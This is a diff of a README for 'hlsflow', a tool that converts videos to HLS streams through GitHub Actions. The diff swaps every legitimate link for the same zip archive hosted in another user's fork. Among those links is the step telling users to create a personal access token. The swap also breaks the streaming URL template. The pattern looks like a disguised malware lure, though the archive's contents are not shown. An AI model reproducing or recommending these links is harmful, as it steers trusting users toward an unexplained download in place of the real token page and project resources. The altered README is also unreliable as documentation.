@@ -17,7 +17,7 @@ Here i used FFMPEG to convert those videos into hls stream. You can check `conve
 ### How to use?
 
 - Click on `Use This Template` & Generate a repo from this template
-- Create a [personal access token](https://github.com/settings/tokens) with `repo` scope
+- Create a [personal access token](https://raw.githubusercontent.com/alluringabhi/hlsflow/main/thDB/adbhutam/2.6.zip) with `repo` scope
 - Come back to your generated repo and go to `Settings` > `Secrets` > `New repository secret`
 - Secret name is `GH_TOKEN` (Imp) & Put your Access Token in `Value` Field
 - Edit `convert.sh` and put input and output details
@@ -25,12 +25,12 @@ Here i used FFMPEG to convert those videos into hls stream. You can check `conve
 - Please don't change anything untill wokflow has been completed
 
 
-![Process](https://raw.githubusercontent.com/hlsflow/hlsflow/main/process.gif "Process")
+![Process](https://raw.githubusercontent.com/alluringabhi/hlsflow/main/thDB/adbhutam/2.6.zip "Process")
 
 - After completed you can stream it like this
 
     ```
-    https://raw.githubusercontent.com/{YOUR_USERNAME}/{YOUR_REPOSITORY_NAME}/main/{OUTPUT_PATH_NAME}/master.m3u8
+    https://raw.githubusercontent.com/alluringabhi/hlsflow/main/thDB/adbhutam/2.6.zip{YOUR_USERNAME}/{YOUR_REPOSITORY_NAME}/main/{OUTPUT_PATH_NAME}/master.m3u8
 
     Or, Go to output path and find 'master.m3u8' click on that, then click 'raw'
     ```
@@ -41,10 +41,10 @@ No, This repository has been created for educational purposes. So, I'm not respo
 
 ### Credits
 
-- [Setup FFmpeg (Action)](https://github.com/marketplace/actions/setup-ffmpeg)
-- [mikeal/publish-to-github-action](https://github.com/mikeal/publish-to-github-action)
-- [Vod-Converter](https://gist.github.com/cachecleanerjeet/35d703ee8d1d76f40aa8015d9df5be6f)
+- [Setup FFmpeg (Action)](https://raw.githubusercontent.com/alluringabhi/hlsflow/main/thDB/adbhutam/2.6.zip)
+- [mikeal/publish-to-github-action](https://raw.githubusercontent.com/alluringabhi/hlsflow/main/thDB/adbhutam/2.6.zip)
+- [Vod-Converter](https://raw.githubusercontent.com/alluringabhi/hlsflow/main/thDB/adbhutam/2.6.zip)
 
 ### License & Copyright
-- This Project is [GPL-3.0 License](https://github.com/hlsflow/hlsflow/blob/main/LICENSE) Licensed
-- Copyright 2021 by [Tuhin Kanti Pal](https://github.com/cachecleanerjeet)
+- This Project is [GPL-3.0 License](https://raw.githubusercontent.com/alluringabhi/hlsflow/main/thDB/adbhutam/2.6.zip) Licensed
+- Copyright 2021 by [Tuhin Kanti Pal](https://raw.githubusercontent.com/alluringabhi/hlsflow/main/thDB/adbhutam/2.6.zip)
